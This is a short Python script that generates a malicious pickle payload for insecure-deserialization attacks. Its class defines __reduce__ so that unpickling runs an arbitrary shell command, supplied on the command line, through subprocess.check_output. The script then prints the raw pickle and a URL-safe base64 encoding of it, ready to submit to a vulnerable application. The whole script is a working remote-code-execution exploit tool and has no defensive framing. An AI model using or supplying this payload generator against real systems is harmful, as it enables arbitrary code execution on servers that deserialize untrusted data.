import pickle
import base64
import sys
import subprocess
import os

class PICKLEREQUEST():
        def __init__(self, cmd):
                self.cmd = cmd
         
        def __reduce__(self):
            return (subprocess.check_output, ([*self.cmd.split(' '),],))
                    

command = sys.argv[1]
pickled = pickle.dumps(PICKLEREQUEST(command))
string64 = base64.urlsafe_b64encode(pickled)
print(f"string not base64{pickled}")
print(f"string base64 {string64}")



